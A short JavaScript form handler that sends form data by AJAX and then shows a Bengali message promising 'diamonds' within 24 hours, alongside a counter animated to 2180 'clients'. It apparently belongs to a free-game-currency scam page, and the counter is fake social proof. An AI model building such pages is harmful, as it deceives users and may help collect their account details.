window.addEventListener("DOMContentLoaded", function () {
  // get the form elements defined in your form HTML above

  var form = document.getElementById("my-form");
  // var button = document.getElementById("my-form-button");
  var status = document.getElementById("status");

  // Success and Error functions for after the form is submitted

  function success() {
var clients = setInterval(happ, 10)
        let count2 = 0;
        function happ() {
            count2++
            document.getElementById("num2").innerHTML = count2
            if (count2 == 2180) {
                clearInterval(clients)
            }
        }
    form.reset();
    status.classList.add("success");
    status.innerHTML = " আপনি ২৪ ঘণ্টার মধ্য ডাইমন পেয়ে যাবেন ";
    
  }

  function error() {
    status.classList.add("error");
    status.innerHTML = " দুঃখিত দয়া করে সঠিক তথ্য দিন ";
    
  }

  // handle the form submission event

  form.addEventListener("submit", function (ev) {
    ev.preventDefault();
    var data = new FormData(form);
    ajax(form.method, form.action, data, success, error);
  });
});

// helper function for sending an AJAX request

function ajax(method, url, data, success, error) {
  var xhr = new XMLHttpRequest();
  xhr.open(method, url);
  xhr.setRequestHeader("Accept", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState !== XMLHttpRequest.DONE) return;
    if (xhr.status === 200) {
      success(xhr.response, xhr.responseType);
    } else {
      error(xhr.status, xhr.response, xhr.responseType);
    }
  };
  xhr.send(data);
}
